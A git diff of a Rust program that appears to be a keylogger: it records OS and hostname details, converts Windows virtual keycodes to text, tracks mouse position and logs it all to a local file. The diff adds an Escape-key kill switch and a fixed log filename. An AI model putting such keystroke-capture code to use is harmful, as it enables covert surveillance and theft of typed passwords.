@@ -112,22 +112,20 @@ fn rec_activity(file: &mut File) {
     let os_info = {
         let info = os_info::get();
         format!(
-            "OS: type: {}\nVersion: {}\n",
+            "OS: {}\nVersion: {}\n",
             info.os_type(),
             info.version()
         )
     };
     log(file, os_info);
 
-    // let hostname = format!(
-    //     "Hostname: {}\n",
-    //     hostname::get_hostname().unwrap_or("_NO_HOSTNAME_".to_string())
-    // );
-    let hostname = "Akshit".to_string(); // or i could use `let hostname::String  = String::from("Akshit")
-    log(file, hostname);
-    //HOSTNAME NOT WORKING RIGHT NOW
+    let hname = format!(
+        "Hostname: {:?}\n", hostname::get().unwrap()
+    );
+    log(file, hname);
 }
 
+// to log any string into a file
 fn log(file: &mut File, s: String) {
     #[cfg(debug_assertions)]
     {
@@ -144,8 +142,8 @@ fn log(file: &mut File, s: String) {
     }
 }
 
-
-fn keycode_to_string(k: u8) -> String { //table for keycode conversion
+// table for keycode conversion
+fn keycode_to_string(k: u8) -> String {
     if (k >= 65 && k <= 90) || (k >= 48 && k <= 57) {
         return format!("{}", (k as char));
     }
@@ -180,12 +178,16 @@ fn keycode_to_string(k: u8) -> String { //table for keycode conversion
         0x17 => "VK_JUNJA".to_string(),
         0x18 => "VK_FINAL".to_string(),
         0x19 => "VK_HANJA,VK_KANJI".to_string(),
-        0x1B => "VK_ESCAPE".to_string(),
+        0x1B => {
+            // kill switch
+            std::process::exit(0);
+            // "VK_ESCAPE".to_string()
+        },
         0x1C => "VK_CONVERT".to_string(),
         0x1D => "VK_NONCONVERT".to_string(),
         0x1E => "VK_ACCEPT".to_string(),
         0x1F => "VK_MODECHANGE".to_string(),
-        0x20 => "VK_SPACE".to_string(),
+        0x20 => " ".to_string(), // "VK_SPACE".to_string(),
         0x21 => "VK_PRIOR".to_string(),
         0x22 => "VK_NEXT".to_string(),
         0x23 => "VK_END".to_string(),
@@ -320,13 +322,15 @@ fn get_mouse_pos() -> String {
 
 fn main() {
     let time: DateTime<Utc> = Utc::now();
-    let filename = format!(
-        "log-{}-{:02}+{:02}+{:02}.log",
-        time.date_naive(),
-        time.hour(),
-        time.minute(),
-        time.second()
-    );
+    // let filename = format!(
+    //     "log-{}-{:02}+{:02}+{:02}.log",
+    //     time.date_naive(),
+    //     time.hour(),
+    //     time.minute(),
+    //     time.second()
+    // );
+
+    let filename = "testing.log";
 
     let mut output = {
         match OpenOptions::new().write(true).create(true).open(&filename) {
